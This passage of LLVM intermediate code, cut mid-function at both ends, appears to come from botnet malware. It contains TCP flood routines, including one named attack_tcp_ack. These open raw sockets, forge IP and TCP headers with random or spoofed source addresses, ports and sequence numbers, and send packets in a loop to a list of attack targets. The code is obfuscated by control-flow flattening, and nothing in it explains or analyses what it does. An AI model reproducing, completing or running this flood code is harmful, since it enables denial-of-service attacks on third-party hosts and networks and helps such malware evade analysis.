  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 -2137837040, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 -2142511021, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -53018792, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1402116950, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 321246160, i32 1775960433
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 -1818550549, i32 2131828434
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 2131828434, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 1623078259, i32 -569924771
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 -569924771, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 2073058314, i32 1382886862
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 1382886862, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 1685667246, i32 -1941978
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 -1941978, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 -696235062, i32 -1272882419
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 -1272882419, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 -1292532336, i32 -1722498177
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 -1722498177, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -467936176, i32 1184037670
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 1184037670, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 -425571582, i32 680131946
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 680131946, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 1129700785, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 1402116950, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 -53018792, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1946683298, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1946683298, label %first
    i32 403746062, label %109
    i32 1388410643, label %110
    i32 -2123535731, label %116
    i32 2067766690, label %119
    i32 1104235553, label %120
    i32 -696334824, label %126
    i32 -852843366, label %174
    i32 1958222355, label %178
    i32 2116409024, label %273
    i32 -375357790, label %279
    i32 2076231690, label %282
    i32 -1429057853, label %285
    i32 -1112615036, label %286
    i32 -1309154351, label %287
    i32 -555429725, label %293
    i32 488783129, label %316
    i32 -430675301, label %337
    i32 1309948297, label %341
    i32 -816868330, label %345
    i32 1811775723, label %350
    i32 -1840815252, label %356
    i32 1584303909, label %361
    i32 1908297981, label %367
    i32 -2026443998, label %372
    i32 2043217239, label %378
    i32 -444156403, label %382
    i32 -1888090359, label %386
    i32 997071823, label %390
    i32 -2133216053, label %394
    i32 1091907575, label %398
    i32 1021047436, label %401
    i32 445414364, label %450
    i32 -1354345849, label %453
    i32 -587640369, label %454
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 403746062, i32 1388410643
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 -587640369, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 -2123535731, i32 2067766690
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 -587640369, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1104235553, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 -696334824, i32 -1429057853
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 1
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 -852843366, i32 1958222355
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 1958222355, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
